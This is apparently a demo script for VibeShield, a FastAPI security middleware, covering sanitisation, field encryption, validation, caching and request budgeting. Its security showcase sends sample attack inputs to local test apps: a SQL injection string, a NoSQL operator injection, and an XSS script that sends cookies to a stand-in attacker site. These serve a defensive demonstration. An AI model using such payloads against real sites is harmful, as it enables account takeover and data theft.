import asyncio
import time
import json
import httpx
from fastapi import FastAPI, Request
from src.core import VibeShieldASGIMiddleware
from src.budget import global_budget_tracker
from src.fetch import vibe_fetch

# ==========================================
# 1. MOCK HANDLERS FOR SECURITY SHOWCASE
# ==========================================

async def run_security_showcase():
    print('\n=============================================================')
    print('🕵️ VIBESHIELD SECURITY SANITIZATION SHOWCASE')
    print('=============================================================\n')

    # Setup Unprotected App
    unprotected_app = FastAPI()
    @unprotected_app.post("/login")
    async def login_unprotected(request: Request):
        data = await request.json()
        return {"status": "success", "data": data}

    # Setup Protected App
    protected_app = FastAPI()
    protected_app.add_middleware(VibeShieldASGIMiddleware)
    @protected_app.post("/login")
    async def login_protected(request: Request):
        data = await request.json()
        return {"status": "success", "data": data}

    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=unprotected_app), base_url="http://localhost") as ac_unprotected, \
               httpx.AsyncClient(transport=httpx.ASGITransport(app=protected_app), base_url="http://localhost") as ac_protected:

        # Case A: SQL Injection
        sqli_body = {"username": "admin' OR '1'='1"}
        print('--- CASE A: SQL INJECTION ---')
        print('Raw Payload sent:', json.dumps(sqli_body))
        
        res_before = await ac_unprotected.post("/login", json=sqli_body)
        print('Before VibeShield:', res_before.text)
        
        res_after = await ac_protected.post("/login", json=sqli_body)
        print('After VibeShield: ', res_after.text)
        print()

        # Case B: NoSQL Injection
        nosqli_body = {"password": {"$ne": "admin"}}
        print('--- CASE B: NOSQL INJECTION ---')
        print('Raw Payload sent:', json.dumps(nosqli_body))
        
        res_before = await ac_unprotected.post("/login", json=nosqli_body)
        print('Before VibeShield:', res_before.text)
        
        res_after = await ac_protected.post("/login", json=nosqli_body)
        print('After VibeShield: ', res_after.text)
        print()

        # Case C: XSS Attack
        xss_body = {"comment": "<script>fetch('malicious-site.com?cookie=' + document.cookie)</script>Nice post!"}
        print('--- CASE C: XSS ATTACK ---')
        print('Raw Payload sent:', json.dumps(xss_body))
        
        res_before = await ac_unprotected.post("/login", json=xss_body)
        print('Before VibeShield:', res_before.text)
        
        res_after = await ac_protected.post("/login", json=xss_body)
        print('After VibeShield: ', res_after.text)
        print()

# ==========================================
# 2. CRYPTOGRAPHY SHOWCASE
# ==========================================

async def run_crypto_showcase():
    print('=============================================================')
    print('🔐 VIBESHIELD TRANSPARENT FIELD ENCRYPTION SHOWCASE')
    print('=============================================================\n')

    crypto_app = FastAPI()
    crypto_app.add_middleware(
        VibeShieldASGIMiddleware, 
        crypto_secret='showcase_super_secret_encryption_key', 
        crypto_fields=['creditCard', 'ssn']
    )

    @crypto_app.post("/checkout")
    async def checkout_protected(request: Request):
        body = await request.json()
        print('  [DB/Handler Memory View]:', json.dumps(body))
        return {"status": "success", "data": body}

    sensitive_body = { 
        "user": "John Doe", 
        "ssn": "999-88-7777",
        "creditCard": "4111-2222-3333-4444" 
    }

    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=crypto_app), base_url="http://localhost") as client:
        print('--- FIELD-LEVEL ENCRYPTION ---')
        print('Client Payload Sent:', json.dumps(sensitive_body))
        print('\nExecuting VibeShield Protected Endpoint...')
        
        res = await client.post("/checkout", json=sensitive_body)
        
        print('\nClient Response Received (Decrypted):', res.text)
        print()

# ==========================================
# 3. VALIDATION & LOGGING SHOWCASE
# ==========================================

async def run_validation_logging_showcase():
    print('=============================================================')
    print('✅ VIBESHIELD VALIDATION & ⏱️ AUDIT LOGGING SHOWCASE')
    print('=============================================================\n')

    validation_app = FastAPI()
    validation_app.add_middleware(
        VibeShieldASGIMiddleware, 
        validation_schema={
            "user": {
                "type": "object",
                "required": True,
                "schema": {
                    "profile": {
                        "type": "object",
                        "required": True,
                        "schema": {
                            "email": {"type": "string", "required": True, "format": "email"}
                        }
                    }
                }
            },
            "cart": {
                "type": "object",
                "schema": {
                    "items": {
                        "type": "array",
                        "elementSchema": {
                            "type": "object",
                            "schema": {
                                "quantity": {"type": "number", "min": 1}
                            }
                        }
                    }
                }
            }
        },
        logging={
            "audit": True,
            "performance_threshold_ms": 500
        }
    )

    @validation_app.post("/register")
    async def register_protected(request: Request):
        body = await request.json()
        await asyncio.sleep(0.6) # Simulating 600ms slow query
        return {"status": "success", "data": body}

    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=validation_app), base_url="http://localhost") as client:
        print('--- CASE A: DEEP VALIDATION REJECTION (400 BAD REQUEST) ---')
        invalid_body = {
            "user": {"profile": {"email": "not-an-email"}},
            "cart": {"items": [{"quantity": 0}]}
        }
        print('Client Payload Sent:', json.dumps(invalid_body))
        
        res_invalid = await client.post("/register", json=invalid_body)
        print('Response Received:', res_invalid.text)
        print()

        print('--- CASE B: SLOW ROUTE EXECUTION (PERFORMANCE WARNING) ---')
        valid_body = {
            "user": {"profile": {"email": "user@example.com"}},
            "cart": {"items": [{"quantity": 2}]}
        }
        print('Client Payload Sent:', json.dumps(valid_body))
        print('(Simulating 600ms delay... watch for the warning)')
        
        res_valid = await client.post("/register", json=valid_body)
        print('Response Received:', res_valid.text)
        print()

# ==========================================
# 4. PERFORMANCE BENCHMARK
# ==========================================

db_query_count = 0

async def run_performance_benchmark():
    global db_query_count
    print('=============================================================')
    print('🚀 VIBESHIELD PERFORMANCE BENCHMARK (1,000 REQUESTS)')
    print('=============================================================\n')

    # Uncached App
    app_uncached = FastAPI()
    @app_uncached.get("/data")
    async def get_data_uncached():
        global db_query_count
        db_query_count += 1
        await asyncio.sleep(0.002)  # Simulates a 2ms database query
        return {"status": "ok", "data": "query-results", "queryNumber": db_query_count}

    # Cached App
    app_cached = FastAPI()
    app_cached.add_middleware(VibeShieldASGIMiddleware, cache_enabled=True, cache_ttl=10.0)
    @app_cached.get("/data")
    async def get_data_cached():
        global db_query_count
        db_query_count += 1
        await asyncio.sleep(0.002)  # Simulates a 2ms database query
        return {"status": "ok", "data": "query-results", "queryNumber": db_query_count}

    iterations = 1000

    # Benchmark 1: Uncached
    print(f"Running {iterations} requests WITHOUT cache...")
    db_query_count = 0
    start_no_cache = time.perf_counter()
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app_uncached), base_url="http://localhost") as client:
        for _ in range(iterations):
            res = await client.get("/data")
            _ = res.text
    end_no_cache = time.perf_counter()
    duration_no_cache = (end_no_cache - start_no_cache) * 1000.0
    queries_no_cache = db_query_count

    print(f"Finished. Duration: {duration_no_cache:.2f} ms")
    print(f"Total Database Queries Executed: {queries_no_cache}\n")

    # Benchmark 2: Cached
    print(f"Running {iterations} requests WITH VibeShield Cache...")
    db_query_count = 0
    start_cache = time.perf_counter()
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app_cached), base_url="http://localhost") as client:
        # First request to warm the cache
        res = await client.get("/data")
        _ = res.text
        
        # Blast remaining 999 requests
        for _ in range(1, iterations):
            res = await client.get("/data")
            _ = res.text
            
    end_cache = time.perf_counter()
    duration_cache = (end_cache - start_cache) * 1000.0
    queries_cache = db_query_count

    print(f"Finished. Duration: {duration_cache:.2f} ms")
    print(f"Total Database Queries Executed: {queries_cache}\n")

    # Calculations
    latency_reduction = ((duration_no_cache - duration_cache) / duration_no_cache) * 100
    average_latency_no_cache = duration_no_cache / iterations
    average_latency_cache = duration_cache / iterations

    print('=============================================================')
    print('📊 BENCHMARK SUMMARY RESULTS')
    print('=============================================================')
    print(f"Without Cache Duration: {duration_no_cache:.2f} ms (Avg: {average_latency_no_cache:.4f} ms/req)")
    print(f"With VibeShield Cache:  {duration_cache:.2f} ms (Avg: {average_latency_cache:.4f} ms/req)")
    print(f"Performance Speedup:    {(duration_no_cache / duration_cache):.1f}x faster")
    print(f"Database Latency Cut:   {latency_reduction:.2f}% reduction")
    print(f"Database Load Relieved: {(((queries_no_cache - queries_cache) / queries_no_cache) * 100):.2f}% fewer queries")
    print('=============================================================\n')

# ==========================================
# 5. VIBEBUDGETER FINANCIAL SHIELD SHOWCASE
# ==========================================
async def run_budget_showcase():
    print('=============================================================')
    print('💸 VIBESHIELD VIBEBUDGETER (FINANCIAL SHIELD) SHOWCASE')
    print('=============================================================\n')

    # Reset state for clean showcase
    global_budget_tracker.reset_for_test()

    # We will simulate the request hitting an arbitrary endpoint using vibe_fetch.
    # To avoid actually pinging a real endpoint 10 times in a test script, 
    # we'll ping a fast public mock endpoint or localhost. We'll use localhost.
    
    budget_options = {
        "budget": {
            "enabled": True,
            "maxDailyRequests": 5
        }
    }

    print('Simulating a rapid loop of 10 external AI API calls...')
    print('VibeBudgeter Limit: 5 requests max\n')

    successful_calls = 0
    blocked_calls = 0

    for i in range(1, 11):
        try:
            # Pinging localhost just to trigger the fetch (doesn't matter if it 404s, budget tracks the outgoing attempt)
            await vibe_fetch("http://localhost", options=budget_options)
            successful_calls += 1
            print(f"[Call {i}] ✅ Success (Under Budget)")
        except Exception as e:
            blocked_calls += 1
            print(f"[Call {i}] ❌ Blocked: {str(e)}")

    print(f"\nSummary: {successful_calls} calls succeeded, {blocked_calls} calls blocked.\n")

async def main():
    await run_security_showcase()
    await run_crypto_showcase()
    await run_validation_logging_showcase()
    await run_performance_benchmark()
    await run_budget_showcase()

if __name__ == "__main__":
    asyncio.run(main())
